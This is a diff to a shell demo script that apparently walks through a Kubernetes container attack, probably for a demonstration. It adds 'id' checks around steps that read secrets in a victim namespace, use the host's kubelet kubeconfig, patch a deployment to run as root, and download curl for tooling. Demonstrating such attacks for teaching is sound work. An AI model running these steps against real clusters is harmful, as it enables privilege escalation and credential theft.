@@ -15,6 +15,9 @@ echo "❓ Can we read the pods or secrets in the victim's ns?"; read -s
 pe "kubectl get secret -n secret6"
 pe "kubectl get pod -n secret6"
 
+echo "❓ What user am I using?"
+pe "kubectl exec deploy/n6 -ti -- id"
+
 echo "❓ Is curl avilable?";read -s
 pei "kubectl exec deploy/n6 -ti -- curl --version"
 echo "ℹ️ Download curl to the container via workstation";read -s
@@ -36,6 +39,9 @@ pe "kubectl exec deploy/n6 -ti -- env KUBECONFIG=/host/etc/kubernetes/kubelet.co
 echo "ℹ️ I need to become root";read -s
 pei "kubectl patch deployment n6 --patch-file=root.patch"
 pei "kubectl rollout status -w deploy/n6"
+
+echo "❓ What user am I using?"
+pe "kubectl exec deploy/n6 -ti -- id"
 
 echo "ℹ️ Download tools (kubeclt + curl)"
 pei "curl -Lo curl.tar.xz https://github.com/stunnel/static-curl/releases/download/8.9.1/curl-linux-aarch64-musl-8.9.1.tar.xz"
